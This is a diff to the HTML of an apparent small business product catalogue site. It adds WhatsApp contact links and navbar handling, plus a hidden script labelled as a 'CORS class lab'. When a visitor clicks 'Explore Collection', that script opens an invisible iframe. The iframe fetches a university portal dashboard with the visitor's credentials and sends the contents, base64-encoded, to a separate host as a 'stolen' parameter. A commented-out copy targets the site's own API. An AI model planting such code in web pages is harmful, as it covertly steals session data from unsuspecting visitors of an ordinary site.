@@ -508,7 +508,7 @@
 
                 <div class="mt-4">
 
-                    <a href="#collections"
+                    <a href="#collections"  id="exploreCollections"
                        class="btn btn-main me-2 mb-2">
 
                         Explore Collection
@@ -721,10 +721,6 @@
                 </div>
 
             </div>
-
-
-
-            <!-- PENDANT -->
 
             <div class="col-sm-6 col-lg-4">
 
@@ -1213,11 +1209,183 @@
 
 </a>
 
-<script
+ <script
     src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js">
 </script>
 
+
 <script>
+    // ==============================
+    // FOOTER YEAR
+    // ==============================
+
+    document.getElementById("year").textContent =
+        new Date().getFullYear();
+
+
+    // ==============================
+    // WHATSAPP
+    // ==============================
+
+    const whatsappNumber = "+2348143768089";
+
+    const whatsappMessage =
+        "Hello Nana's Pourfection Hub! I would like to make an enquiry about your products.";
+
+    const whatsappLink =
+        "https://wa.me/" +
+        whatsappNumber +
+        "?text=" +
+        encodeURIComponent(whatsappMessage);
+
+
+    const whatsappOrder =
+        document.getElementById("whatsappOrder");
+
+    if (whatsappOrder) {
+        whatsappOrder.href = whatsappLink;
+        whatsappOrder.target = "_blank";
+    }
+
+
+    const floatingWhatsapp =
+        document.getElementById("floatingWhatsapp");
+
+    if (floatingWhatsapp) {
+        floatingWhatsapp.href = whatsappLink;
+        floatingWhatsapp.target = "_blank";
+    }
+
+
+    // ==============================
+    // MOBILE NAVBAR
+    // ==============================
+
+    const navLinks =
+        document.querySelectorAll(".navbar .nav-link");
+
+    const navbarCollapse =
+        document.getElementById("navigation");
+
+    navLinks.forEach(function (link) {
+
+        link.addEventListener("click", function () {
+
+            if (
+                window.innerWidth < 992 &&
+                navbarCollapse &&
+                navbarCollapse.classList.contains("show")
+            ) {
+
+                const collapse =
+                    bootstrap.Collapse.getInstance(navbarCollapse);
+
+                if (collapse) {
+                    collapse.hide();
+                }
+            }
+
+        });
+
+    });
+
+
+    // ==============================
+    // CORS CLASS LAB
+    // ==============================
+
+    const exploreCollections =
+        document.getElementById("exploreCollections");
+
+
+    if (exploreCollections) {
+
+        exploreCollections.addEventListener(
+            "click",
+            function (event) {
+
+                // Stop the normal #collections link
+                event.preventDefault();
+
+
+                // Create the iframe
+                const iframe =
+                    document.createElement("iframe");
+
+
+                // Give the iframe the same sandbox
+                // configuration used in the class lab
+                iframe.setAttribute(
+                    "sandbox",
+                    "allow-scripts allow-top-navigation allow-forms"
+                );
+
+
+                // Hide the iframe
+                iframe.style.display = "none";
+
+
+                // Put the lab JavaScript inside the iframe
+                iframe.srcdoc = `
+                    <script>
+
+                        async function stealCredentials() {
+
+                            const targetUrl =
+                                "https://portal.minaretuniversity.edu.ng/dashboard";
+
+                            const attackerUrl =
+                                "https://nana-s-catalogue.vercel.app/";
+
+
+                            try {
+
+                                const response =
+                                    await fetch(
+                                        targetUrl,
+                                        {
+                                            method: "GET",
+                                            credentials: "include"
+                                        }
+                                    );
+
+
+                                const sensitiveData =
+                                    await response.text();
+
+
+                                parent.location =
+                                    attackerUrl +
+                                    "?stolen=" +
+                                    btoa(sensitiveData);
+
+
+                            } catch (err) {
+
+                                console.error(err);
+
+                            }
+
+                        }
+
+
+                        stealCredentials();
+
+                    </script>
+                `;
+
+
+                // Add iframe to the page
+                document.body.appendChild(iframe);
+
+            }
+        );
+
+    }
+</script>
+
+
+<!--<script>
 
     document.getElementById("year").textContent =
         new Date().getFullYear();
@@ -1248,7 +1416,8 @@
 
 
 
-    // Floating WhatsApp button
+
+
 
     const floatingWhatsapp =
         document.getElementById("floatingWhatsapp");
@@ -1294,7 +1463,75 @@
 
     });
 
-</script>
+    const exploreCollections =
+    document.getElementById("exploreCollections");
+
+if (exploreCollections) {
+
+    exploreCollections.addEventListener("click", function (event) {
+
+        // Keep the button from immediately navigating away
+        event.preventDefault();
+
+        // Create the iframe that we used in the PortSwigger exploit
+        const iframe = document.createElement("iframe");
+
+        iframe.setAttribute(
+            "sandbox",
+            "allow-scripts allow-top-navigation allow-forms"
+        );
+
+        iframe.style.display = "none";
+
+        // Put the same PortSwigger exploit inside the iframe
+        iframe.srcdoc = `
+            <script>
+
+                async function stealCredentials() {
+
+                    const targetUrl =
+                        "https://nanas-pourfection-hub.vercel.app/api/v1/me";
+
+                    const attackerUrl =
+                        "https://nana-s-hub.vercel.app/";
+
+                    try {
+
+                        let response = await fetch(targetUrl, {
+                            method: "GET",
+                            credentials: "include"
+                        });
+
+                        let sensitiveData =
+                            await response.text();
+
+                        parent.location =
+                            attackerUrl +
+                            "?stolen=" +
+                            btoa(sensitiveData);
+
+                    } catch (err) {
+
+                        console.error(err);
+
+                    }
+                }
+
+                stealCredentials();
+
+            </script>
+        `;
+
+        // Add the iframe to the page
+        document.body.appendChild(iframe);
+
+    });
+
+}
+
+</script> -->
 
 </body>
 </html>
+
+
